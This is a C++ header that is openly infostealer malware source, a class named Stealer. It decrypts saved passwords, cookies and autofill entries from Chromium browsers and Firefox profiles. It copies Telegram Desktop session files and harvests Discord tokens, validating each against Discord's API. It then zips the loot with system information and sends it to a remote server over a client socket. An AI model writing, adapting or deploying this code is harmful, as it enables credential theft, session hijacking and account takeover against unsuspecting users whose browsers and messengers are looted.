
#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <stack>
#include <thread>
#include <mutex>
#include <windows.h>
#include <wincrypt.h>
#include <ShlObj.h>
#include <regex>
#include <kubazip/zip/zip.h>
#include <botan/base64.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <curl/curl.h>

#include "../Helper/Helper.hpp"
#include "info.hpp"
#include "chromium.hpp"
#include "firefox.hpp"
#include "structures.hpp"

#pragma comment (lib, "botan.lib")

namespace Core
{
    class Stealer {
    private:
        inline static std::mutex myMutex;
        static void writeBufToZip(struct zip_t* zip, std::filesystem::path srcPath, std::string localPath, std::string Buffer = "")
        {
            myMutex.lock();
            try
            {
                if (Buffer.empty()) // write file
                {
                    if (std::filesystem::exists(srcPath)) {
                        std::ifstream src(srcPath, std::ios::binary);
                        // Get the file size
                        src.seekg(0, std::ios::end);
                        std::streampos fileSize = src.tellg();
                        src.seekg(0, std::ios::beg);
                        // Read the file data into a vector (buffer)
                        std::vector<char> buffer(fileSize);
                        src.read(buffer.data(), fileSize);
                        src.close();
                        zip_entry_open(zip, localPath.c_str());
                        {
                            zip_entry_write(zip, buffer.data(), fileSize);
                        }
                        zip_entry_close(zip);
                    }
                }
                else // write buffer (Steal Chromium and Firefox)
                {
                    zip_entry_open(zip, localPath.c_str());
                    {
                        zip_entry_write(zip, Buffer.c_str(), Buffer.size());
                    }
                    zip_entry_close(zip);
                }
            }
            catch (const std::exception&) {}
            myMutex.unlock();
        }
        static void zip_directory_recursive(struct zip_t* zip, const std::filesystem::path src, const std::filesystem::path dst, int maxSize = 20)
        {
            try {
                if (!std::filesystem::exists(src) || !std::filesystem::is_directory(src)) {
                    return;
                }

                std::vector<std::string> filesArray;
                for (const auto& entry : std::filesystem::recursive_directory_iterator(src)) {
                    if (entry.is_regular_file() && std::filesystem::file_size(entry.path()) <= maxSize * 1024 * 1024) {
                        filesArray.push_back(entry.path().string());
                    }
                }
                std::string prefix = src.string();
                for (const auto& path : filesArray) {
                    std::string input = path;
                    if (input.compare(0, prefix.length(), prefix) == 0) {
                        // Remove the prefix from the input string
                        input.erase(0, prefix.length());
                        writeBufToZip(zip, std::filesystem::path(path), dst.string() + input);
                    }
                }
            }
            catch (const std::exception& e) {}
        }

    public:
        class Browser {
        public:
            static void stealChromium(struct zip_t* zip)
            {
                std::map<std::wstring, std::wstring> ChromiumBrowsers = Chromium::BrowsersInitialization();
                DecryptedAccount decryptedAccounts;
                DecryptedCookie decryptedCookies;
                AutoFill decryptedAutoFill;
                for (const auto& t : ChromiumBrowsers) {
                    decryptedAccounts = Chromium::getPasswords(t.second);
                    decryptedCookies = Chromium::getCookies(t.second);
                    decryptedAutoFill = Chromium::getAutoFill(t.second);
                    if (decryptedAccounts.success) {
                        std::stringstream concatenatedString;
                        std::string fileName = "Passwords\\" + Helper::WstringToString(t.first + L"_passwords.txt");
                        for (size_t i = 0; i < decryptedAccounts.website.size(); i++) {
                            concatenatedString << decryptedAccounts.website[i] << '\t' << decryptedAccounts.username[i] << '\t' << decryptedAccounts.password[i] << std::endl;
                        }
                        writeBufToZip(zip, "", fileName, concatenatedString.str());
                    }
                    if (decryptedCookies.success) {
                        std::stringstream concatenatedString;
                        std::string fileName = "Cookies\\" + Helper::WstringToString(t.first + L"_cookies.txt");
                        for (size_t i = 0; i < decryptedCookies.hostkey.size(); i++) {
                            concatenatedString << decryptedCookies.hostkey[i] << '\t' << decryptedCookies.httponly[i] << '\t' << decryptedCookies.path[i] << '\t' << decryptedCookies.secure[i] << '\t' << decryptedCookies.expires_utc[i] << '\t' << decryptedCookies.name[i] << '\t' << decryptedCookies.decrypted_value[i] << std::endl;
                        }
                        writeBufToZip(zip, "", fileName, concatenatedString.str());
                    }
                    if (decryptedAutoFill.success) {
                        std::stringstream concatenatedString;
                        std::string fileName = "AutoFill\\" + Helper::WstringToString(t.first + L"_autofill.txt");
                        for (size_t i = 0; i < decryptedAutoFill.name.size(); i++) {
                            concatenatedString << decryptedAutoFill.name[i] << '\t' << decryptedAutoFill.value[i] << std::endl;
                        }
                        writeBufToZip(zip, "", fileName, concatenatedString.str());
                    }
                }
            }

            static void stealFirefox(struct zip_t* zip)
            {
                std::filesystem::path firePath = Helper::getUserFolder() / std::filesystem::path("AppData\\Roaming\\Mozilla\\Firefox\\Profiles");
                if (std::filesystem::exists(firePath)) {
                    std::vector<Cookies> cookies;
                    std::vector<DecryptedLogins> decryptedLogins;
                    int profileNum = 1;
                    for (const auto& profile : std::filesystem::directory_iterator(firePath)) {
                        if (profile.is_directory()) {
                            if (std::filesystem::exists(profile.path() / "key4.db")) {
                                try
                                {
                                    std::tuple<Botan::secure_vector<uint8_t>, std::string> key_algo = Firefox::getKey(profile.path());
                                    std::list<Logins> logins = Firefox::getLoginData(profile.path());
                                    if (std::get<1>(key_algo) == "1.2.840.113549.1.12.5.1.3" || std::get<1>(key_algo) == "1.2.840.113549.1.5.13")
                                    {
                                        decryptedLogins.push_back(Firefox::getDecryptedLogins(key_algo, logins, profileNum));
                                        cookies.push_back(Firefox::getCookie(profile.path(), profileNum));
                                    }
                                    profileNum++;
                                }
                                catch (const std::exception&)
                                {
                                }
                            }
                        }
                    }
                    if (!decryptedLogins.empty()) {
                        for (const auto& t : decryptedLogins) {
                            std::stringstream concatenatedString;
                            std::string fileName = "Passwords\\firefox_profile" + t.fireProfile + "_passwords.txt";
                            for (size_t i = 0; i < t.hostname.size(); i++) {
                                concatenatedString << t.hostname[i] << '\t' << t.login[i] << '\t' << t.password[i] << std::endl;
                            }
                            writeBufToZip(zip, "", fileName, concatenatedString.str());
                        }
                    }
                    if (!cookies.empty()) {
                        for (const auto& t : cookies) {
                            std::stringstream concatenatedString;
                            std::string fileName = "Cookies\\firefox_profile" + t.fireProfile + "_cookies.txt";
                            for (size_t i = 0; i < t.hostkey.size(); i++) {
                                concatenatedString << t.hostkey[i] << '\t' << t.httponly[i] << '\t' << t.path[i] << '\t' << t.secure[i] << '\t' << t.expires_utc[i] << '\t' << t.name[i] << '\t' << t.value[i] << std::endl;
                            }
                            writeBufToZip(zip, "", fileName, concatenatedString.str());
                        }
                    }
                }
            }
        };

        class Messengers {
        private:
            static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
                size_t total_size = size * nmemb;
                output->append(static_cast<char*>(contents), total_size);
                return total_size;
            }
            static std::string TokenState(const std::string token) {
                try {
                    //curl_global_init(CURL_GLOBAL_DEFAULT);
                    CURL* curl = curl_easy_init();
                    if (curl) {
                        CURLcode res;
                        std::string response;

                        // Set the API endpoint and token
                        std::string url = "https://discord.com/api/v9/users/@me";
                        struct curl_slist* headers = nullptr;
                        headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
                        headers = curl_slist_append(headers, "Content-Type: application/json");

                        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
                        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback);
                        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
                        // Perform the HTTP GET request
                        res = curl_easy_perform(curl);
                        // Clean up
                        curl_easy_cleanup(curl);
                        curl_slist_free_all(headers);
                        curl = nullptr;

                        if (res == CURLE_OK) {
                            if (response.find("\"id\"") == std::string::npos) {
                                return "Token is invalid";
                            }
                            else {
                                nlohmann::json userinfoJSON = nlohmann::json::parse(response);
                                if (userinfoJSON.contains("message")) {
                                    return "Token is invalid";
                                }
                                return "Username: " + userinfoJSON["username"].get<std::string>() + "Id: " + userinfoJSON["id"].get<std::string>();
                            }
                        }
                    }
                }
                catch (const std::exception& e) {}
                return "Connection error";
            }
            static std::vector<std::string> findMatch(std::string str, std::regex reg)
            {
                std::vector<std::string> output;
                std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
                std::sregex_iterator lastMatch;
                while (currentMatch != lastMatch) {
                    std::smatch match = *currentMatch;
                    output.push_back(match.str());
                    currentMatch++;
                }
                return output;
            }

        public:
            static void grabTelegram(struct zip_t* zip)
            {
                try
                {
                    std::filesystem::path telegram_tdata_path = Helper::getUserFolder() / std::filesystem::path(L"AppData\\Roaming\\Telegram Desktop\\tdata");
                    std::string TmpName = "Messengers\\Telegram\\";

                    if (std::filesystem::exists(telegram_tdata_path))
                    {
                        for (const auto& entry : std::filesystem::directory_iterator(telegram_tdata_path))
                        {
                            std::string filename = entry.path().filename().string();
                            std::filesystem::path telegram_file_zip = TmpName + filename;
                            if (entry.is_directory() && filename.length() == 16) {
                                zip_directory_recursive(zip, entry.path(), telegram_file_zip);
                            }
                            else if (entry.is_regular_file())
                            {
                                if (std::filesystem::file_size(entry.path()) > 20 * 1024 * 1024) {
                                    continue;
                                }
                                if (filename.length() == 17 && filename.back() == 's') {
                                    writeBufToZip(zip, entry.path(), telegram_file_zip.string());
                                }
                                if (filename.compare(0, 7, "usertag") == 0 || filename.compare(0, 8, "settings") == 0 || filename.compare(0, 8, "key_data") == 0) {
                                    writeBufToZip(zip, entry.path(), telegram_file_zip.string());
                                }
                            }
                        }
                    }
                }
                catch (const std::exception&) {}
            }

            static void grabDiscord(struct zip_t* zip)
            {
                try
                {
                    //std::regex TokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");
                    std::regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    std::regex reg2("mfa\\.[\\w-]{84}");
                    std::wstring userFolder = Helper::getUserFolder();
                    std::vector<std::string> tokens;
                    std::vector<std::filesystem::path> directories;
                    directories.push_back(userFolder / std::filesystem::path(L"AppData\\Roaming\\discord\\Local Storage\\leveldb"));
                    directories.push_back(userFolder / std::filesystem::path(L"AppData\\Roaming\\Discord\\Local Storage\\leveldb"));

                    for (const std::filesystem::path& dbfolder : directories)
                    {
                        if (!std::filesystem::exists(dbfolder))
                            continue;

                        for (const auto& entry : std::filesystem::directory_iterator(dbfolder)) {
                            if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
                                std::ifstream file(entry.path().string(), std::ios::binary);
                                std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                                file.close();

                                std::vector<std::string> check = findMatch(fileContent, reg1);
                                std::vector<std::string> check2 = findMatch(fileContent, reg2);

                                for (int i = 0; i < check.size(); i++) {
                                    tokens.push_back(check[i] + " - " + TokenState(check[i]));
                                }
                                for (int i = 0; i < check2.size(); i++) {
                                    tokens.push_back(check[i] + " - " + TokenState(check[i]));
                                }
                            }
                        }
                    }
                    if (tokens.size() > 0) {
                        std::stringstream concatenatedString;
                        for (const auto& t : tokens) {
                            concatenatedString << t << '\n';
                        }
                        writeBufToZip(zip, "", "DiscordTokens.txt", concatenatedString.str());
                    }
                }
                catch (const std::exception&) {}
            }
        };

        static void StartStealer()
        {
            try
            {
                char* outbuf = NULL;
                size_t outbufSize = 0;
                struct zip_t* zip = zip_stream_open(NULL, 0, ZIP_DEFAULT_COMPRESSION_LEVEL, 'w');

                std::thread t1(Browser::stealChromium, zip); //plugins also
                std::thread t2(Browser::stealFirefox, zip);
                t1.join();
                t2.join();

                std::thread t3(Messengers::grabTelegram, zip);
                std::thread t4(Messengers::grabDiscord, zip);
                t3.join();
                t4.join();

                Info::getSystemInfo(zip, "system_info.txt");

                zip_stream_copy(zip, (void**)&outbuf, &outbufSize);
                zip_stream_close(zip);

                std::vector<uint8_t> data = Network::BufferAsBytes(outbuf, outbufSize);
                free(outbuf);

                std::string tmp = "LOGS:";
                std::vector<uint8_t> tmp_vec(tmp.begin(), tmp.end());

                tmp_vec.reserve(tmp_vec.size() + data.size());
                tmp_vec.insert(tmp_vec.end(), data.begin(), data.end());

                if (!Connection::ClientSocket::Send(Network::ProtocolZip::Compress(tmp_vec))) {
                    Connection::ClientSocket::DataQueue.push(Network::ProtocolZip::Compress(tmp_vec));
                }

            }
            catch (...) {}
        }

    };
}

